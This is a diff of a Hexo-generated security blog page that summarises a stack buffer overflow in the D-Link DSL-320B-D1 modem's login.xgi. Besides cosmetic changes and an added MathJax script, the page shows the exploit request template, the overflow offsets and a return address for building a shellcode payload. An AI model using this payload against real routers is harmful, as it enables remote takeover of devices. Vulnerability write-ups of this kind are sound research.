@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      124 자
+      243 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      4
        분
     </span>
   
@@ -244,12 +244,12 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>DSL-320B-D1, EU_1.25 and lower</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL 모뎀, DSL-320b-D1, EU_1.25 이하의 버전에서 인증되지 않은 사용자가 원격에서 디바이스를 탈취할 수 있는 Stack Buffer Overflow 취약점이 발견되었습니다.</p>
-<p>취약점은 로그인을 담당하는 <code>login.xgi</code>에서 <code>user</code>와 <code>pass</code> 인자를 통해 발생합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL &#xBAA8;&#xB380;, DSL-320b-D1, EU_1.25 &#xC774;&#xD558;&#xC758; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; <code>login.xgi</code>&#xC5D0;&#xC11C; <code>user</code>&#xC640; <code>pass</code> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span>
 <span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre>
 
-<p><code>user</code> 파라미터를 사용해 취약점을 악용하기 위해서 구성되는 페이로드는 다음과 같습니다.</p>
+<p><code>user</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span>
 <span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span>
 
@@ -257,7 +257,7 @@
 <span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)
 <span class="hljs-attribute">payload</span> += shellcode</code></pre>
 
-<p>반면에 <code>pass</code> 파라미터는 오프셋으로 641을 사용합니다. 페이로드는 GET request에서 파라미터로 전달되어야 하며 ROP를 사용하면 하드 코딩된 주소를 사용하지 않고 exploit이 가능합니다.</p>
+<p>&#xBC18;&#xBA74;&#xC5D0; <code>pass</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; 641&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; GET request&#xC5D0;&#xC11C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBA70; ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -558,6 +558,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
